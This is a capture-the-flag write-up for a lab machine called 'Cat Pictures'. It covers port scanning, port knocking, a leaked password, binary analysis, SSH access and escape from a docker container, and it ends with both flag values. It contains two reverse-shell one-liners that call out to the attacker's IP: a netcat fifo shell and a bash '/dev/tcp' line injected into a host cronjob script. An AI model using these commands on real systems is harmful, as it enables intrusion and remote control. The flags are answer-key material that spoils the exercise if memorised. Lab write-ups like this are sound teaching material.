# Cat Pictures

### Flags, flags, flags!
Initial nmap scan shows port 22, 4420 and 8080 open, 21 and 2375 filtered: 

    PORT     STATE    SERVICE      VERSION
    21/tcp   filtered ftp
    22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
    |   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
    |_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
    2375/tcp filtered docker
    4420/tcp open     nvm-express?
    | fingerprint-strings: 
    |   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
    |     INTERNAL SHELL SERVICE
    |     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
    |     ctrl-c
    |     Please enter password:
    |     Invalid password...
    |     Connection Closed
    |   NULL, RPCCheck: 
    |     INTERNAL SHELL SERVICE
    |     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
    |     ctrl-c
    |_    Please enter password:
    8080/tcp open     http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
    | http-open-proxy: Potentially OPEN proxy.
    |_Methods supported:CONNECTION
    |_http-title: Cat Pictures - Index page
    |_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
    
![image](https://github.com/user-attachments/assets/871acec5-e4e3-41b9-8ff4-012394d53c0b)<br />
Port 4420 seems to serve an internal shell service that I can only use if I prompt the right password. 
<br />
Let's check out the webserver. Enumerating it I found this forum: <br />
![image](https://github.com/user-attachments/assets/6aea59eb-04b7-4db6-b2c5-51e3b1e4f893)<br />
This is a huge hint. What I need to do is a **port knocking** attack. What is port knocking?<br />

Port knocking is an authentication technique used by network administrators. It consists of a specified sequence of closed port connection attempts to specific IP addresses called a knock sequence. The techniques uses a daemon that monitors a firewall’s log files looking for the correct connection request sequence.<br />

The hint suggests me that I probably need to "knock" on ports 1111,2222,3333 and 4444 sequentially. To knock on ports, I'm going to use the `knock` command(sudo apt-get install knockd). Look what happens: <br />
![image](https://github.com/user-attachments/assets/8839c287-05d2-4fc2-a7dc-7061e358d030)<br />
On the left terminal, the first nmap shows that the ftp port is filtered (blocked by a firewall). However after trying to knock on the ports on the right terminal, the next nmap shows port 21 open! Our IP address is authenticated to access the FTP server.<br />
The FTP server is accessible with anonymous login, and contains a file called `note.txt` with the following content: <br />
![image](https://github.com/user-attachments/assets/d9defc21-ae52-4fb5-8f11-c4ad4119dfcf)<br />
So I used the password `sardinethecat` to log into the internal shell service on port 4420. This shell is very minimal, and can't even run the `cd` command. So I spawned a reverse shell on port 4444 using the command `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.85.53 4444 >/tmp/f`.
Inside `/home/catlover/` directory there's a binary called `runme`:<br />
![image](https://github.com/user-attachments/assets/8cfe0505-774f-4aa2-90ab-6415dba9a4d0)<br />
I need to find the right password. For that, there are a couple of ways. The most tedious one is to run `cat /home/catlover/runme` and find the password trapped inside garbage(the `strings` command is not available in the machine):<br />
![image](https://github.com/user-attachments/assets/cb21c4b0-107e-4dac-ac53-a8acaadfe31f)<br />
The other way (the way I used) is to transfer the binary on my machine using netcat, and then quickly analyzing it using IDA: <br />
![image](https://github.com/user-attachments/assets/9185742a-b623-4e8d-84cc-94183dfe8c26)<br />
As you can see, it's much more evident. <br />
After prompting the password `rebecca`, after a while a private ssh key is created inside catlover's home directory: <br />
![image](https://github.com/user-attachments/assets/dfa96664-0989-4852-9984-ea1365fd8c03)<br />
What I can do now is copy the private key in my machine, change it's permission with `chmod 600 id_rsa_catlover` and login with `ssh catlover@target_IP -i id_rsa_catlover`. This got me the first flag. <br />
After logging in with ssh, the first thing I notice is that I'm root. But not THE root. I'm inside a docker container(since there's a `.dockerenv` file inside `/`) and I need to find a way to escape. <br />
If I run the `mount` command this is a part of the output: <br />
![image](https://github.com/user-attachments/assets/74bc4620-2618-4013-a5fe-fffe7acccb1a)<br />
Seeing `/dev/xvda1` is suspicious and might be a shared resource with the host machine. <br />
Among other paths, it is also mounted in `/opt/clean/` in which there's a `clean.sh` file that might be a cronjob. <br />
Viewing the contents this looks like it is removing the contents of the /tmp/ directory. I placed some files in the directory and waited. After a short while the files had been removed from the directory.<br />
So to spawn a reverse shell on my machine, I run `echo "bash -i >& /dev/tcp/10.11.85.53/6666 0>&1" >> clean.sh`, and then wait for the connection: <br />
![image](https://github.com/user-attachments/assets/f56dc8cb-e3fc-443e-b21d-988bcc48ff13)<br />

- Flag 1: `7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9`
- Root Flag `4a98e43d78bab283938a06f38d2ca3a3c53f0476`
